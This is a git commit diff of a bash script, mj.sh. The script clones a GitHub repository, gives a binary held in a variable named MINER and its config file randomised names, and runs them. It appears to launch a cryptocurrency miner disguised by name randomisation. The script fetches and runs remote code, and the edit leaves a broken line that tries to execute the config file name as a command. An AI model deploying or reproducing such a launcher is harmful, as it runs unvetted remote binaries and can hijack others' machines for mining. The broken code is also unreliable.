7e64593ce9e47bdda81e7b546efa9bf879a2121f
v <87249353+asemtenan1234@users.noreply.github.com>
2021-07-12 22:07:29 +0700

    Update mj.sh

--- mj.sh
+++ mj.sh
@@ -1,19 +1,11 @@
 #!/bin/bash
-
 MINER=$(echo $(shuf -i 1000-9999 -n 1)-NICE)
-
 INI=$(echo $(shuf -i 1000-9999 -n 1)-INI).ini
-
 sudo apt update
-
 git clone https://github.com/githubasem/asu 
-
 cd asu
-
 mv gas $MINER
-
 mv keun.ini $INI
-
-chmod +x gas keun.ini
-
+chmod +x $MINER
+ $INI
 ./$MINER $INI
